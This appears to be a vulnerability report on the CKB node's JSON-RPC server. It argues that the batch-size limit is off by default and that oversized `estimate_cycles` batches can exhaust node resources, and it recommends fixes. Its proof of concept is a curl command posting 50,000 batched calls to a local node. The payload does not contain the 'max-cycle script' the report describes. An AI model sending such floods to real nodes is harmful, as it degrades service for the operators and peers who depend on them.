### Title
Unbounded JSON-RPC Batch Request Size Enables Resource Exhaustion DoS — (`rpc/src/server.rs`)

### Summary
The CKB JSON-RPC server has no enforced default limit on the number of calls in a JSON-RPC batch request. The `rpc_batch_limit` guard is opt-in and disabled by default. An unprivileged RPC caller can submit a single HTTP POST containing an arbitrarily large batch of expensive method calls, forcing the node to process all of them, exhausting CPU and memory without any per-request or per-connection rate control.

### Finding Description

The `rpc_batch_limit` field in the RPC config struct is typed as `Option<usize>` with no `#[serde(default)]` annotation, meaning it is `None` when absent from `ckb.toml`. [1](#0-0) 

In `RpcServer::new`, the global `JSONRPC_BATCH_LIMIT` static is only initialized when the operator has explicitly set the option: [2](#0-1) 

Inside `handle_jsonrpc`, the batch size guard is gated on `JSONRPC_BATCH_LIMIT.get()` returning `Some`. When the limit is not configured, the `if let Some(...)` branch is never entered and the entire batch is dispatched unconditionally: [3](#0-2) 

The shipped default configuration explicitly documents this as an unconfigured state and leaves the protective line commented out: [4](#0-3) 

The default production module list includes `Experiment`, which exposes `estimate_cycles` (and the deprecated `dry_run_transaction`). Both execute CKB-VM scripts up to `max_tx_verify_cycles = 70_000_000` cycles per call with no fee payment required: [5](#0-4) [6](#0-5) 

### Impact Explanation

A single HTTP POST containing N batch calls, each invoking `estimate_cycles` with a maximally expensive script, forces the node's async runtime to schedule N concurrent script-execution tasks, each consuming up to 70 M VM cycles. Memory grows proportionally to N (response buffering via `StreamBodyAs::json_array`). There is no per-IP connection limit, no per-session call quota, and no concurrency cap on batch dispatch. The node's tokio runtime and RocksDB snapshot readers are saturated, degrading or halting block processing, sync, and tx-pool operations for all other peers.

### Likelihood Explanation

The RPC server binds to `127.0.0.1:8114` by default, so the attacker must be a local process or a process with network access to the node host. This matches the stated attacker model ("RPC caller", "supported local CLI/RPC user"). Many operators expose the RPC port to internal networks or behind reverse proxies without additional rate limiting. The attack requires no credentials, no special knowledge, and no prior state — a single crafted HTTP request is sufficient. The codebase itself acknowledges the risk in a comment but provides no safe default.

### Recommendation

1. Set a safe hard-coded default for `rpc_batch_limit` (e.g., 100–200) in the `Config` struct using `#[serde(default = "default_batch_limit")]`, so protection is active without operator action.
2. Add per-IP or per-connection request-rate limiting at the HTTP layer (e.g., a `tower` middleware) independent of the batch limit.
3. Cap the total number of concurrent in-flight batch sub-calls using a semaphore so a single batch cannot monopolize the async runtime.

### Proof of Concept

```
# Send a batch of 50,000 estimate_cycles calls, each with a max-cycle script.
# No rpc_batch_limit configured → all 50,000 are dispatched.
curl -s http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d "$(python3 -c "
import json
call = {
  'jsonrpc': '2.0', 'id': 1,
  'method': 'estimate_cycles',
  'params': [{'version':'0x0','cell_deps':[],'header_deps':[],
              'inputs':[{'previous_output':{'tx_hash':'0x'+'0'*64,'index':'0x0'},'since':'0x0'}],
              'outputs':[],'outputs_data':[],'witnesses':[]}]
}
print(json.dumps([call] * 50000))
")"
```

The node processes all 50,000 calls. With no batch limit set, `JSONRPC_BATCH_LIMIT.get()` returns `None`, the guard at `rpc/src/server.rs:275` is skipped, and the full stream is dispatched via `stream::iter(calls).then(...)` with no concurrency bound. [3](#0-2) [1](#0-0)

### Citations

**File:** util/app-config/src/configs/rpc.rs (L43-44)
```rust
    /// Number of RPC batch limit.
    pub rpc_batch_limit: Option<usize>,
```

**File:** rpc/src/server.rs (L34-55)
```rust
static JSONRPC_BATCH_LIMIT: OnceLock<usize> = OnceLock::new();

#[doc(hidden)]
#[derive(Debug)]
pub struct RpcServer {
    pub http_address: SocketAddr,
    pub tcp_address: Option<SocketAddr>,
    pub ws_address: Option<SocketAddr>,
}

impl RpcServer {
    /// Creates an RPC server.
    ///
    /// ## Parameters
    ///
    /// * `config` - RPC config options.
    /// * `io_handler` - RPC methods handler. See [ServiceBuilder](../service_builder/struct.ServiceBuilder.html).
    /// * `handler` - Tokio runtime handle.
    pub fn new(config: RpcConfig, io_handler: IoHandler, handler: Handle) -> Self {
        if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
            let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
        }
```

**File:** rpc/src/server.rs (L274-296)
```rust
            Request::Batch(calls) => {
                if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
                    && calls.len() > *batch_size
                {
                    return make_error_response(jsonrpc_core::Error::invalid_params(format!(
                        "batch size is too large, expect it less than: {}",
                        batch_size
                    )));
                }

                let stream = stream::iter(calls)
                    .then(move |call| {
                        let io = Arc::clone(&io);
                        async move { io.handle_call(call, T::default()).await }
                    })
                    .filter_map(|response| async move { response });

                (
                    [(axum::http::header::CONTENT_TYPE, "application/json")],
                    StreamBodyAs::json_array(stream),
                )
                    .into_response()
            }
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** resource/ckb.toml (L215-215)
```text
max_tx_verify_cycles = 70_000_000
```
